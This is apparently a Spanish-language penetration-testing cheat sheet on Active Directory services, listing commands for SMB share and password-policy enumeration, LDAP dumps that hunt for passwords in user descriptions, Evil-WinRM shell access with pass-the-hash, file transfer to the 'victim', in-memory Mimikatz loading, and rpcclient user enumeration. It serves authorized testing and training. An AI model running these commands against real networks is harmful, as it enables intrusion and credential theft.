---
title: Servicios Específicos de Active Directory
pubDate: '2025-11-26'
---

## 📂 1. SMB (Puerto 445)
Es el protocolo fundamental para el intercambio de archivos y para la ejecución remota de procedimientos (RPC) en entornos Windows.

### Enumeración de Recursos y Permisos
```bash
# Listar recursos compartidos y permisos de acceso (Read/Write)
nxc smb <IP> -u 'usuario' -p 'password' --shares

# Listar de forma recursiva todo el contenido de los shares
smbmap -H <IP> -u 'usuario' -p 'password' -R
```

### Información de Seguridad del Dominio
```bash
# Ver política de contraseñas (Longitud, complejidad y umbral de bloqueo)
nxc smb <IP> -u 'usuario' -p 'password' --pass-pol

# Enumerar sesiones activas en el equipo
nxc smb <IP> -u 'usuario' -p 'password' --sessions
```

---

## 🌐 2. LDAP (Puertos 389 / 636)
LDAP es el servicio de directorio que almacena toda la información de objetos en el AD. Es la fuente de información más rica del dominio.

### Consultas Estratégicas
```bash
# Volcado masivo de la base de datos de objetos
ldapsearch -x -H ldap://<IP> -D "usuario@dominio.local" -w "password" -b "DC=dominio,DC=local"

# Buscar usuarios cuyas descripciones contengan la palabra "pass" o "clave"
ldapsearch -x -H ldap://<IP> -D "usuario@dominio.local" -w "password" -b "DC=dominio,DC=local" "(description=*pass*)"
```

---

## 🐚 3. WinRM (Puertos 5985 / 5986)
Windows Remote Management es el protocolo de gestión remota de Microsoft. Si un usuario pertenece al grupo "Remote Management Users", puedes obtener acceso por consola.

### Evil-WinRM (La herramienta estándar)
```bash
# Conexión básica por texto claro (5985)
evil-winrm -i <IP> -u 'usuario' -p 'password'

# Acceso mediante Pass-the-Hash (Sin conocer la contraseña plana)
evil-winrm -i <IP> -u 'usuario' -H <HASH_NTLM>
```

**Comandos útiles dentro de la shell de Evil-WinRM:**
*   `upload /ruta/kali /ruta/windows`: Transferir archivos a la víctima.
*   `download /ruta/windows`: Traer archivos a tu máquina.
*   `menu`: Acceder a funciones avanzadas como cargar scripts (Mimikatz, BloodHound) directamente en memoria.

---

## 🛠️ 4. RPCClient (Enumeración manual)
Ideal para consultas rápidas sin necesidad de herramientas de terceros complejas.
```bash
rpcclient -U "usuario%password" <IP>

# Dentro de la consola interactiva:
> enumdomusers      # Listar todos los usuarios del dominio
> queryuser <RID>    # Obtener info detallada de un usuario (ej: 500, 501, 1103...)
> enumdomgroups     # Listar grupos del dominio
```

> **Tip:** Si `evil-winrm` no conecta, verifica si el servicio está usando SSL (Puerto 5986). Puedes forzar el uso de SSL con el parámetro `-S`.
